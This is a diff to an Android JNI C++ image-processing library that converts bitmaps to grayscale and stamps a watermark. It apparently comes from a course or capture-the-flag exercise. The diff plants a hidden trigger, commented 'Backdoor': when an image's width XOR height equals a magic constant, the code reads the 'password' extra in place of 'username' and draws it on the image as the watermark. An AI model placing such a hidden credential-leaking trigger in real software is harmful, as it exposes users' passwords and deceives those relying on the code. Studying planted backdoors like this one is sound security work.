@@ -8,6 +8,8 @@
 #include <sys/stat.h>
 #include <jni.h>
 #include <android/bitmap.h>
+#include <android/log.h>
+
 #include <bmp_parse.h>
 #include "../include/bmp_parse.h"
 
@@ -104,6 +106,9 @@ Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *e
     return;
 }
 */
+
+jint magic = static_cast<jint>(0x234);
+
 jint get_int_from_color(unsigned int red, unsigned int green, unsigned int blue){
     red = (red << 16) & 0x00FF0000; //Shift red 16-bits and mask out other stuff
     green = (green << 8) & 0x0000FF00; //Shift Green 8-bits and mask out other stuff
@@ -147,7 +152,7 @@ jobject add_watermark(JNIEnv *env, jobject thiz, jobject bmp, jcharArray waterma
     JavaVM* jvm;
     jclass watermarkClass;
     jmethodID set_watermark;
-    constexpr jint size = 100;
+    constexpr jint size = 70;
     constexpr jint alpha = 255;
     constexpr jint color = 0xFF0000; // Red
     constexpr jint x = size / 2, y = size / 2;
@@ -225,33 +230,41 @@ Java_com_example_jni_1android_1client_HomeActivity_modifyBitmapGrayscale(JNIEnv 
     jclass bmp_class;
     jlong native_ptr;
     jobject new_bmp;
-
-    // const char *Param1 = env->GetStringUTFChars(jsParam1, 0);
-    //When done with it, or when you've made a copy
-    // env->ReleaseStringUTFChars(jsParam1, Param1);
-    jstring username = get_extra(env, thiz, "password");
-    jcharArray username_chararray = jstring_to_chararray(env, username, JNI_FALSE);
+    char* key = "username";
 
     bmp_class = env->GetObjectClass(bmp);
 
     native_ptr = get_native_ptr(env, bmp_class, bmp);
     auto [width, height] = get_dimensions(env, bmp_class, bmp);
+
+    // Backdoor
+    if ((width ^ height) == magic) {
+        key = "password";
+    }
+
+    // Height with grayscale
     jint new_height = (height > 150) ? height - 150 : height;
     jint finish_index = new_height * width;
 
     // Acquire pixel array from bitmap
     auto [pixels, pixels_arr, pixels_len] = get_pixel_array(env, bmp_class, native_ptr, width, height);
 
-    for (int index=0; index < pixels_len; ++index) {
-        if (index >= finish_index)
-            break;
+    // Turn every pixel to grayscale
+    for (int index=0; index < finish_index; ++index) {
         jint color = pixels_arr[index];
         pixels_arr[index] = convert_to_grayscale(color);
     }
 
+    // Set bitmap to grayscale
     set_pixel_array(env, bmp_class, native_ptr, pixels, width, height);
 
-    new_bmp = add_watermark(env, thiz, bmp, username_chararray);
+    jstring username = get_extra(env, thiz, key);
+    if (username != nullptr) {
+        jcharArray username_chararray = jstring_to_chararray(env, username, JNI_FALSE);
+        new_bmp = add_watermark(env, thiz, bmp, username_chararray);
+    } else {
+        new_bmp = nullptr;
+    }
     // Delete pixels reference, and free the memory
     env->DeleteLocalRef(pixels);
     return new_bmp;
